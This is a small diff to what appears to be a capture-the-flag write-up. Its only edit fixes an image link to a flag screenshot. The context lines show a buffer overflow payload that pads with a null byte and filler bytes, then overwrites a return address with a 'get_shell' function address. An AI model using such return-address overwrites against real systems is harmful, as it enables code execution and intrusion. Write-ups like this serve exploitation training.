@@ -85,7 +85,7 @@ payload = b'a' *15 + b'\x00'
 payload = payload.ljust(56, b'B')
 payload += p64(0x0000000000401273)  //get_shell address
 ```
-![](images/flag)
+![](images/flag.png)
 
 # Full script
 
